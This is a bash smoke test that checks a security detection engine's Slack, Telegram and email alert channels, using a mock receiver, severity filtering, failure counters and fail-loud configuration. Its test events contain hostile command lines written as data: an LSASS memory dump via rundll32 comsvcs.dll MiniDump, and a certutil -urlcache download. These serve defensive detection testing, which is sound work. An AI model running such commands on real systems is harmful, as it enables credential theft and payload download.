#!/usr/bin/env bash
# End-to-end verification of the external notification channels (C2):
# Slack, Telegram and email notifiers fed by the REAL engine binary,
# with per-channel stats wired into /api/stats and fail-loud config.
#
# Scenarios (exit 0 only if all pass):
#   1. real telemetry (LSASS dump, critical) reaches BOTH chat channels
#   2. a second, lower-severity alert (certutil, high) reaches the
#      unfiltered channels while the min_severity: critical channel
#      FILTERS it (filtered counter, no delivery)
#   3. the mock receiver captured well-formed payloads: slack carries
#      {"text": ...} with the rendered line; telegram carries chat_id
#      plus the same text (Bot API path /bot<token>/sendMessage)
#   4. the email channel points at a dead relay: its deliveries FAIL
#      after retries while the engine stays healthy — a dead channel is
#      an operational problem, never a detection failure
#   5. /api/stats notify_channels exposes per-channel sent/failed/
#      dropped/filtered rows (parity with the webhook counters)
#   6. a broken -notify config stops the engine at startup (fail loud)
#
# Usage: scripts/dev-tests/smoke_notify.sh [engine-binary]
# The engine is built automatically when missing (go >= 1.22 in PATH).
# Ports default to 18301 (mock), 18302 (API), 18303 (ingest).

set -u

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
MOCK="${SMOKE_RECEIVER_PORT:-18301}"
API="${SMOKE_API_PORT:-18302}"
INGEST="${SMOKE_INGEST_PORT:-18303}"
WORK="$(mktemp -d)"
ENGINE="${1:-$WORK/sf-engine}"
PASS=0
FAIL=0

cleanup() {
  [ -n "${ENGINE_PID:-}" ] && { kill "$ENGINE_PID" 2>/dev/null; wait "$ENGINE_PID" 2>/dev/null; }
  [ -n "${MOCK_PID:-}" ] && kill "$MOCK_PID" 2>/dev/null
  rm -rf "$WORK"
}
trap cleanup EXIT

say() { printf '%s\n' "$*"; }
ok()   { PASS=$((PASS+1)); say "  ok: $*"; }
bad()  { FAIL=$((FAIL+1)); say "  FAIL: $*"; }

api() { curl -s -m 5 "http://127.0.0.1:${API}$1"; }

# stats_field <channel> <field>: value of one notify_channels counter
stats_field() {
  api /api/stats | python3 -c "
import json,sys
data=json.load(sys.stdin)
rows={r['name']: r for r in data.get('notify_channels', [])}
print(rows.get('$1', {}).get('$2', 'missing'))
"
}

say "== smoke_notify: external notification channels against the real engine =="

if [ ! -x "$ENGINE" ]; then
  command -v go >/dev/null || { say "FALLO preflight: go no está en PATH (exporta el toolchain para compilar el engine)"; exit 1; }
  (cd "$ROOT" && go build -o "$ENGINE" ./cmd/engine) || { say "build failed"; exit 1; }
fi
mkdir -p "$WORK/no-sequences"

# --- fixtures -----------------------------------------------------------------
cat > "$WORK/notify.yaml" <<YAML
channels:
  - type: slack
    name: slack-all
    url: http://127.0.0.1:${MOCK}/slack/services/T000/B000/lab
  - type: slack
    name: slack-crit-only
    url: http://127.0.0.1:${MOCK}/slack/services/T000/B000/crit
    min_severity: critical
  - type: telegram
    name: telegram-lab
    token: "123456:LAB-TOKEN"
    chat_id: "-100999"
    api_url: http://127.0.0.1:${MOCK}
  - type: email
    name: email-dead-relay
    server: 127.0.0.1:1
    from: sf@lab.test
    to: ["soc@lab.test"]
    starttls: false
YAML

cat > "$WORK/notify-broken.yaml" <<YAML
channels:
  - type: pigeon
    name: nope
YAML

start_mock() {
  python3 "$ROOT/scripts/dev-tests/notify_receiver.py" --port "$MOCK" --out "$WORK/captures.jsonl" \
    > "$WORK/mock.log" 2>&1 &
  MOCK_PID=$!
  for _ in $(seq 1 50); do
    grep -q "listening" "$WORK/mock.log" 2>/dev/null && return 0
    sleep 0.1
  done
  say "mock receiver did not start:"; cat "$WORK/mock.log"; exit 1
}

start_engine() {
  "$ENGINE" -api "127.0.0.1:${API}" -addr "127.0.0.1:${INGEST}" \
    -rules "$ROOT/rules" -sequences "$WORK/no-sequences" -suppressions "" \
    -notify "$WORK/notify.yaml" \
    > "$WORK/engine.log" 2>&1 &
  ENGINE_PID=$!
  for _ in $(seq 1 50); do
    if api /api/health | grep -q '"ok"'; then return 0; fi
    sleep 0.2
  done
  say "engine did not become healthy:"; cat "$WORK/engine.log"; exit 1
}

feed() { # feed <event-id> <json-line>
  printf '%s\n' "$2" | timeout 3 python3 -c "
import socket,sys
s=socket.create_connection(('127.0.0.1',$INGEST),timeout=2)
s.sendall(sys.stdin.buffer.read()); s.close()"
}

start_mock
start_engine
say "-- scenario 1-2: real telemetry fans out to the configured channels"

# critical: rundll32 + comsvcs.dll + MiniDump -> lsass_dump_comsvcs (critical)
feed "ev-notify-1" '{"id":"ev-notify-1","timestamp":"'"$(date -u +%Y-%m-%dT%H:%M:%SZ)"'","type":"process.create","source":"e2e","host":"LAB-NOTIFY","process":{"pid":4242,"name":"rundll32.exe","command_line":"rundll32.exe comsvcs.dll MiniDump 4242 C:\\Temp\\dump.full"}}'
# high: certutil -urlcache -> certutil_download (high)
feed "ev-notify-2" '{"id":"ev-notify-2","timestamp":"'"$(date -u +%Y-%m-%dT%H:%M:%SZ)"'","type":"process.create","source":"e2e","host":"LAB-NOTIFY","process":{"pid":4243,"name":"certutil.exe","command_line":"certutil.exe -urlcache -f http://127.0.0.1:1/x http://127.0.0.1:1/y"}}'

# wait until the unfiltered channels delivered both alerts
WAITED=0
while [ "$WAITED" -lt 100 ]; do
  S=$(stats_field slack-all sent); T=$(stats_field telegram-lab sent)
  [ "$S" = "2" ] && [ "$T" = "2" ] && break
  sleep 0.2; WAITED=$((WAITED+1))
done

[ "$(stats_field slack-all sent)" = "2" ] && ok "slack-all delivered 2 alerts (critical + high)" \
  || bad "slack-all sent = $(stats_field slack-all sent), want 2"
[ "$(stats_field telegram-lab sent)" = "2" ] && ok "telegram-lab delivered 2 alerts" \
  || bad "telegram-lab sent = $(stats_field telegram-lab sent), want 2"

say "-- scenario 2b: min_severity floor filters the high alert on the critical channel"
C_SENT=$(stats_field slack-crit-only sent); C_FILT=$(stats_field slack-crit-only filtered)
[ "$C_SENT" = "1" ] && [ "$C_FILT" = "1" ] \
  && ok "slack-crit-only sent=1 filtered=1 (the high alert never left the engine)" \
  || bad "slack-crit-only sent=$C_SENT filtered=$C_FILT, want 1/1"

say "-- scenario 3: mock captures carry the channel contracts"
python3 - "$WORK/captures.jsonl" <<'PY' && ok "captures: slack text + telegram chat_id with the rendered alert" || bad "captures malformed (see above)"
import json,sys
rows=[json.loads(l) for l in open(sys.argv[1]) if l.strip()]
slack=[r for r in rows if r["path"].startswith("/slack/")]
tg=[r for r in rows if r["path"].startswith("/bot123456:LAB-TOKEN/sendMessage")]
assert slack and tg, f"slack={len(slack)} tg={len(tg)}"
assert all("text" in r["body"] for r in slack), slack
assert any("CRITICAL" in r["body"]["text"] and "MiniDump" in r["body"]["text"] for r in slack), slack
assert all("chat_id" in r["body"] and "text" in r["body"] for r in tg), tg
assert any(r["body"]["chat_id"]=="-100999" for r in tg), tg
PY

say "-- scenario 4: a dead relay fails without touching the engine"
E_FAILED=""
for _ in $(seq 1 100); do
  E_FAILED=$(stats_field email-dead-relay failed)
  [ "$E_FAILED" = "2" ] && break
  sleep 0.2
done
[ "$E_FAILED" = "2" ] && ok "email-dead-relay failed=2 (retries exhausted, counted)" \
  || bad "email-dead-relay failed=$E_FAILED, want 2"
api /api/health | grep -q '"ok"' && ok "engine healthy with one channel dead" \
  || bad "engine degraded by a dead notification channel"

say "-- scenario 5: /api/stats rows are complete (sent/failed/dropped/filtered)"
api /api/stats | python3 -c "
import json,sys
rows={r['name']: r for r in json.load(sys.stdin)['notify_channels']}
assert set(rows) == {'slack-all','slack-crit-only','telegram-lab','email-dead-relay'}, rows
for name,r in rows.items():
    assert set(('sent','failed','dropped','filtered')) <= set(r), (name, r)
    assert r['type'] in ('slack','telegram','email'), (name, r)
" && ok "4 channels with complete counter rows and correct types" || bad "notify_channels rows incomplete"

say "-- scenario 6: broken config fails loud at startup"
# Alternate ports: the engine binds ingest+api BEFORE loading the notify
# config (same placement as the webhook connector), so the broken run
# needs free ports to reach the fail-loud path instead of exiting 0 via
# the ingest-conflict branch (bind semantics confirmed live).
BROKEN_API=$((API+90)); BROKEN_INGEST=$((INGEST+90))
"$ENGINE" -api "127.0.0.1:${BROKEN_API}" -addr "127.0.0.1:${BROKEN_INGEST}" \
  -rules "$ROOT/rules" -notify "$WORK/notify-broken.yaml" \
  > "$WORK/broken.log" 2>&1
CODE=$?
if [ "$CODE" -ne 0 ] && grep -q "unknown type" "$WORK/broken.log"; then
  ok "engine refused to start, naming the problem (exit $CODE)"
else
  bad "broken config: exit=$CODE (want non-zero), log: $(cat "$WORK/broken.log")"
fi

kill "$ENGINE_PID" 2>/dev/null; wait "$ENGINE_PID" 2>/dev/null; ENGINE_PID=""

say ""
say "== resultado: $PASS ok / $FAIL FAIL =="
[ "$FAIL" -eq 0 ]
